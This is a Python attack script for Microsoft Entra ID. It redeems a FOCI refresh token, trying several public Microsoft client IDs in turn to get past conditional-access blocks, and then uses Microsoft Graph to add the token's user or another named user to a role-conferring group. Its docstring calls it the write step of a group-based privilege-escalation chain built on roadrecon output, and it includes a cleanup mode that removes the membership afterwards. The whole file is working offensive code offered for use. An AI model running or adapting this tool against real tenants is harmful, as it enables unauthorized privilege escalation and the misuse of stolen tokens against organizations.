#!/usr/bin/env python3
"""
add_to_group.py - add (or remove) a user to/from an Entra ID group, given a
Graph access token or a FOCI refresh token.

The write step of the group-escalation chain surfaced by roadrecon_privesc.py:
with Group.ReadWrite.All / GroupMember.ReadWrite.All (e.g. tenant-wide via
Microsoft Graph PowerShell), add yourself to a non-role-assignable group that
confers a role, then pair with check_group_membership.py to confirm.

Only works on STATIC groups; dynamic (rule-based) groups reject direct adds.
WRITES to the directory - confirm gate on by default (use --yes to skip).

The auth block (FOCI redemption + token reading) is intentionally identical to
check_group_membership.py so the two stay copy-pasteable as standalone files.

Examples:
    # add yourself (token's user) to a group, then verify
    python3 add_to_group.py --refresh-token "$RT" --group "JAFRA_MDM_Corp Users"
    python3 check_group_membership.py --refresh-token "$RT" --group "JAFRA_MDM_Corp Users"

    # add a specific user by UPN/id, non-interactive
    python3 add_to_group.py --token "$AT" --group <group-guid> --member alice@corp.com --yes

    # cleanup: remove yourself afterwards
    python3 add_to_group.py --refresh-token "$RT" --group "JAFRA_MDM_Corp Users" --remove --yes
"""

import argparse
import json
import re
import sys
import urllib.parse

import requests

GRAPH = "https://graph.microsoft.com/v1.0"
GUID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

# Public FOCI clients to redeem a refresh token as (no secret needed). A FOCI
# refresh token is interchangeable across the family, but a given RT may be
# bound to one member or a client may be CA-blocked, so we try them in order.
DEFAULT_FOCI_CLIENT = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
FOCI_CLIENTS = [
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Microsoft Azure CLI"),
    ("1950a258-227b-4e31-a9cf-717495945fc2", "Microsoft Azure PowerShell"),
    ("14d82eec-204b-4c2f-b7e8-296a70dab67e", "Microsoft Graph PowerShell"),
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure Active Directory PowerShell"),
    ("d1ddf0e4-d672-4dae-b554-9d5bdfd93547", "Microsoft Intune PowerShell"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
]


# --- auth block (identical to check_group_membership.py) ---

def _read_source(value, is_file, label):
    """Resolve a token from a literal, '-' (stdin), or a file path."""
    if value == "-":
        raw = sys.stdin.read().strip()
    elif is_file:
        with open(is_file, "r", encoding="utf-8") as f:
            raw = f.read().strip()
    else:
        raw = (value or "").strip()
    if not raw:
        return None
    if raw.lower().startswith("bearer "):
        raw = raw[7:].strip()
    # tolerate a tokens.jsonl line: pull the right field for this source
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            raw = obj.get("refresh_token" if label == "refresh" else "access_token", raw)
        except ValueError:
            pass
    return raw


def _try_redeem(rt, client_id, tenant):
    """One redemption attempt. Returns (access_token, None) or (None, error)."""
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": rt,
        "scope": "https://graph.microsoft.com/.default offline_access",
    }
    try:
        r = requests.post(url, data=data, timeout=30)
    except requests.RequestException as e:
        return None, f"request error: {e}"
    if r.status_code == 200:
        at = r.json().get("access_token")
        return (at, None) if at else (None, "no access_token in response")
    try:
        err = r.json()
        return None, f"{err.get('error')}: {err.get('error_description', '')[:200]}"
    except ValueError:
        return None, f"HTTP {r.status_code}: {r.text[:200]}"


def redeem_refresh_token(rt, client_id, tenant, fallback=True):
    """Exchange a (FOCI) refresh token for a Graph access token via a public
    client. Tries the chosen client first, then the rest of the FOCI family
    until one succeeds."""
    names = dict(FOCI_CLIENTS)
    order = [client_id] + [c for c, _ in FOCI_CLIENTS if c != client_id] if fallback else [client_id]
    last = None
    for cid in order:
        at, err = _try_redeem(rt, cid, tenant)
        if at:
            label = names.get(cid, cid)
            print(f"[*] redeemed refresh token via {label} ({cid}), tenant {tenant}.", file=sys.stderr)
            return at
        last = err
        print(f"[-] {names.get(cid, cid)} ({cid}) failed: {err}", file=sys.stderr)
    sys.exit(f"[!] refresh-token redemption failed against all {len(order)} client(s). Last: {last}")


def read_token(args):
    if args.refresh_token or args.refresh_token_file:
        rt = _read_source(args.refresh_token, args.refresh_token_file, "refresh")
        if not rt:
            sys.exit("[!] no refresh token provided.")
        return redeem_refresh_token(rt, args.client_id, args.tenant, fallback=not args.no_fallback)
    tok = _read_source(args.token, args.token_file, "access")
    if not tok:
        sys.exit("[!] no token provided (use --token / --token-file / --token -, or --refresh-token).")
    return tok


# --- graph helpers ---

def graph_get(session, url):
    r = session.get(url, timeout=30)
    if r.status_code == 401:
        sys.exit("[!] 401 Unauthorized - token expired, wrong audience (needs graph.microsoft.com), or revoked.")
    if r.status_code == 403:
        sys.exit(f"[!] 403 Forbidden - token lacks the scope for this call.\n    {r.text[:300]}")
    r.raise_for_status()
    return r.json()


def subject_id(session, member):
    if not member or member.lower() == "me":
        u = graph_get(session, f"{GRAPH}/me?$select=id,userPrincipalName")
        return u["id"], u.get("userPrincipalName", "me")
    ident = urllib.parse.quote(member, safe="")
    u = graph_get(session, f"{GRAPH}/users/{ident}?$select=id,userPrincipalName")
    return u["id"], u.get("userPrincipalName", member)


def resolve_group(session, group):
    if GUID_RE.match(group):
        g = graph_get(session, f"{GRAPH}/groups/{group}?$select=id,displayName,groupTypes,isAssignableToRole")
        return g
    filt = urllib.parse.quote(f"displayName eq '{group.replace(chr(39), chr(39)*2)}'", safe="")
    hits = graph_get(session, f"{GRAPH}/groups?$filter={filt}&$select=id,displayName,groupTypes,isAssignableToRole").get("value", [])
    if not hits:
        sys.exit(f"[!] no group found with displayName == {group!r}")
    if len(hits) > 1:
        sys.exit(f"[!] {len(hits)} groups share that name; pass the objectId instead.")
    return hits[0]


def main():
    ap = argparse.ArgumentParser(description="Add or remove a user to/from an Entra ID group.")
    ap.add_argument("--token", help="Graph access token string, or '-' for stdin.")
    ap.add_argument("--token-file", help="File with the access token (or a tokens.jsonl line).")
    ap.add_argument("--refresh-token", help="Refresh token to redeem (FOCI), or '-' for stdin. Overrides --token.")
    ap.add_argument("--refresh-token-file", help="File with a refresh token (or a tokens.jsonl line).")
    ap.add_argument("--client-id", default=DEFAULT_FOCI_CLIENT, help="FOCI public client to try FIRST (default: Azure CLI).")
    ap.add_argument("--tenant", default="organizations", help="Tenant for redemption (default: organizations).")
    ap.add_argument("--no-fallback", action="store_true", help="Only try --client-id, no FOCI fallback.")
    ap.add_argument("--group", required=True, help="Target group: objectId or exact displayName.")
    ap.add_argument("--member", default="me", help="User to add/remove: UPN, objectId, or 'me' (default).")
    ap.add_argument("--remove", action="store_true", help="Remove the member instead of adding (cleanup).")
    ap.add_argument("--yes", action="store_true", help="Skip the confirmation prompt.")
    args = ap.parse_args()

    token = read_token(args)
    session = requests.Session()
    session.headers.update({"Authorization": f"Bearer {token}", "Accept": "application/json"})

    g = resolve_group(session, args.group)
    gid, gname = g["id"], g.get("displayName")
    dynamic = "DynamicMembership" in (g.get("groupTypes") or [])
    uid, ulabel = subject_id(session, args.member)
    action = "REMOVE" if args.remove else "ADD"

    if dynamic and not args.remove:
        sys.exit(f"[!] '{gname}' is a DYNAMIC group - direct add not allowed; you must satisfy its membership rule.")
    if g.get("isAssignableToRole"):
        print(f"[!] note: '{gname}' is role-assignable - needs RoleManagement.ReadWrite.Directory, not Group.ReadWrite.All.", file=sys.stderr)

    print(f"[*] {action}: {ulabel} ({uid})  {'from' if args.remove else 'to'}  {gname} ({gid})")
    if not args.yes:
        if input("    proceed? [y/N] ").strip().lower() not in ("y", "yes"):
            sys.exit("[*] aborted.")

    if args.remove:
        r = session.delete(f"{GRAPH}/groups/{gid}/members/{uid}/$ref", timeout=30)
        if r.status_code in (204, 200):
            print(f"[+] removed {ulabel} from {gname}.")
        elif r.status_code == 404:
            print(f"[-] {ulabel} was not a member of {gname} (nothing to remove).")
        else:
            sys.exit(f"[!] remove failed ({r.status_code}): {r.text[:300]}")
    else:
        body = {"@odata.id": f"{GRAPH}/directoryObjects/{uid}"}
        r = session.post(f"{GRAPH}/groups/{gid}/members/$ref", json=body, timeout=30)
        if r.status_code == 204:
            print(f"[+] added {ulabel} to {gname}.")
        elif r.status_code == 400 and "already exist" in r.text.lower():
            print(f"[=] {ulabel} is already a member of {gname}.")
        else:
            sys.exit(f"[!] add failed ({r.status_code}): {r.text[:300]}")


if __name__ == "__main__":
    main()
